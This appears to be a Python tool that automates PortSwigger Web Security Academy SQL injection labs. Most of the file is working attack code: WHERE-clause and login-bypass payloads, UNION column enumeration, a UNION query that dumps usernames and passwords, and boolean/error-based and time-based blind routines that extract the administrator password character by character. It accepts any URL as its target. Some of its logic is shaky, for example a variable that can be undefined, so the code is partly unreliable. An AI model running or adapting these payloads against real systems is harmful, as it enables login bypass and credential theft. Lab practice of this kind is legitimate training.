#!/usr/bin/env python3
"""
PortSwigger Web Security Academy SQL Injection Automation Tool
Supports automated completion of SQL injection labs
"""

import requests
from urllib.parse import urljoin, quote
import re
import string
import time
from bs4 import BeautifulSoup

class PortSwiggerSQLi:
    def __init__(self, lab_url):
        self.lab_url = lab_url
        self.session = requests.Session()

    def lab1_hidden_data(self):
        """
        Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
        Goal: Display all products, including hidden ones
        """
        print("\n[*] Lab 1: WHERE clause injection")

        # Test injection point
        payload = "' OR 1=1--"
        url = f"{self.lab_url}/filter?category={quote(payload)}"

        r = self.session.get(url)

        if "Congratulations" in r.text or len(r.text) > 10000:
            print("[+] ✅ Success! All products displayed")
            return True
        else:
            print("[-] ❌ Failed")
            return False

    def lab2_login_bypass(self):
        """
        Lab 2: SQL injection vulnerability allowing login bypass
        Goal: Login as administrator
        """
        print("\n[*] Lab 2: Login bypass")

        # Construct injection payload
        payload = {
            "username": "administrator'--",
            "password": "test"
        }

        url = f"{self.lab_url}/login"
        r = self.session.post(url, data=payload, allow_redirects=True)

        if "Congratulations" in r.text or "administrator" in r.text:
            print("[+] ✅ Success! Login bypass achieved")
            return True
        else:
            print("[-] ❌ Failed")
            return False

    def lab3_determine_columns(self):
        """
        Lab 3: SQL injection UNION attack, determining the number of columns
        Goal: Determine the number of columns returned by the SQL query
        """
        print("\n[*] Lab 3: Determine column count")

        # Method 1: ORDER BY test
        for i in range(1, 20):
            payload = f"' ORDER BY {i}--"
            url = f"{self.lab_url}/filter?category={quote(payload)}"
            r = self.session.get(url)

            if "error" in r.text.lower() or r.status_code != 200:
                columns = i - 1
                print(f"[+] ✅ Column count: {columns}")
                return columns

        # Method 2: NULL injection
        for i in range(1, 20):
            nulls = ','.join(['NULL'] * i)
            payload = f"' UNION SELECT {nulls}--"
            url = f"{self.lab_url}/filter?category={quote(payload)}"
            r = self.session.get(url)

            if r.status_code == 200:
                print(f"[+] ✅ Column count: {i}")
                return i

        print("[-] ❌ Unable to determine column count")
        return 0

    def lab4_find_text_column(self, target_string='aWSEbO'):
        """
        Lab 4: SQL injection UNION attack, finding a column containing text
        Goal: Make the query return a specified string
        """
        print("\n[*] Lab 4: Find text column")

        # First determine column count
        columns = self.lab3_determine_columns()

        # Test each column
        for i in range(1, columns + 1):
            nulls = ['NULL'] * columns
            nulls[i-1] = f"'{target_string}'"
            payload = f"' UNION SELECT {','.join(nulls)}--"

            url = f"{self.lab_url}/filter?category={quote(payload)}"
            r = self.session.get(url)

            if target_string in r.text:
                print(f"[+] ✅ Found! Column {i} can contain text")
                return i

        print("[-] ❌ No text column found")
        return 0

    def lab5_retrieve_data(self):
        """
        Lab 5: SQL injection UNION attack, retrieving data from other tables
        Goal: Retrieve usernames and passwords from the users table
        """
        print("\n[*] Lab 5: Extract user data")

        # First determine column count
        columns = self.lab3_determine_columns()

        if columns < 2:
            print("[-] ❌ Insufficient columns")
            return None

        # Extract user data
        payload = "' UNION SELECT username, password FROM users--"
        url = f"{self.lab_url}/filter?category={quote(payload)}"
        r = self.session.get(url)

        # Parse user data
        soup = BeautifulSoup(r.text, 'html.parser')

        # Find administrator user
        if "administrator" in r.text:
            # Extract password (needs adjustment based on actual page structure)
            match = re.search(r'administrator[^\w]+(\w+)', r.text)
            if match:
                password = match.group(1)
                print(f"[+] ✅ administrator password: {password}")
                return password

        print("[-] ❌ Administrator user not found")
        return None

    def lab10_blind_sqli_conditional(self):
        """
        Lab 10: Blind SQL injection with conditional responses
        Goal: Extract administrator password using blind injection
        """
        print("\n[*] Lab 10: Blind injection (conditional responses)")

        password = ""

        # 1. Determine password length
        for length in range(1, 50):
            payload = f"' AND (SELECT CASE WHEN LENGTH(password)>{length} THEN 1/0 ELSE NULL END FROM users WHERE username='administrator')--"

            headers = {"Cookie": f"TrackingId={payload}"}
            r = self.session.get(self.lab_url, headers=headers)

            if r.status_code != 500:
                password_length = length
                print(f"[+] Password length: {password_length}")
                break

        # 2. Extract password characters
        for pos in range(1, password_length + 1):
            for char in string.ascii_lowercase + string.digits:
                payload = f"' AND (SELECT CASE WHEN SUBSTR(password,{pos},1)='{char}' THEN 1/0 ELSE NULL END FROM users WHERE username='administrator')--"

                headers = {"Cookie": f"TrackingId={payload}"}
                r = self.session.get(self.lab_url, headers=headers)

                if r.status_code == 500:
                    password += char
                    print(f"[+] Current progress: {password}")
                    break

        print(f"[+] ✅ Full password: {password}")
        return password

    def lab12_blind_sqli_time(self):
        """
        Lab 12: Blind SQL injection with time delays
        Goal: Extract data using time-based blind injection
        """
        print("\n[*] Lab 12: Blind injection (time delays)")

        password = ""

        # 1. Confirm injection point
        payload = "' AND SLEEP(5)--"
        start = time.time()
        r = self.session.get(f"{self.lab_url}/filter?category={quote(payload)}")
        elapsed = time.time() - start

        if elapsed > 5:
            print("[+] ✅ Time-based blind injection available")

        # 2. Extract password (example)
        # Only demonstrating the concept here; full implementation needed in practice
        for pos in range(1, 21):
            for char in string.ascii_lowercase + string.digits:
                payload = f"' AND IF(SUBSTR((SELECT password FROM users WHERE username='administrator'),{pos},1)='{char}', SLEEP(2), 0)--"

                start = time.time()
                r = self.session.get(f"{self.lab_url}/filter?category={quote(payload)}")
                elapsed = time.time() - start

                if elapsed > 2:
                    password += char
                    print(f"[+] Current progress: {password}")
                    break

        print(f"[+] ✅ Full password: {password}")
        return password


def main():
    """
    Main function - Automatically complete all labs
    """
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║     PortSwigger SQL Injection Lab Automation Tool         ║
    ║             Version 1.0 - 7x24 Learning Mode              ║
    ╚═══════════════════════════════════════════════════════════╝
    """)

    # Example lab URL (needs to be replaced with actual one)
    lab_url = input("Enter the lab URL: ").strip()

    if not lab_url:
        print("[-] ❌ No lab URL provided")
        return

    sqli = PortSwiggerSQLi(lab_url)

    # Auto-complete all labs
    labs = [
        ("Lab 1: WHERE clause injection", sqli.lab1_hidden_data),
        ("Lab 2: Login bypass", sqli.lab2_login_bypass),
        ("Lab 3: Determine column count", sqli.lab3_determine_columns),
        ("Lab 4: Find text column", sqli.lab4_find_text_column),
        ("Lab 5: Extract user data", sqli.lab5_retrieve_data),
    ]

    print("\n" + "="*60)
    print("Starting automated lab completion")
    print("="*60)

    completed = 0
    for lab_name, lab_func in labs:
        print(f"\n{'='*60}")
        print(f"Completing: {lab_name}")
        print(f"{'='*60}")

        try:
            if lab_func():
                completed += 1
                print(f"[+] ✅ {lab_name} completed")
            else:
                print(f"[-] ❌ {lab_name} failed")
        except Exception as e:
            print(f"[!] ❌ {lab_name} exception: {e}")

    print("\n" + "="*60)
    print(f"Completion stats: {completed}/{len(labs)}")
    print("="*60)


if __name__ == "__main__":
    main()
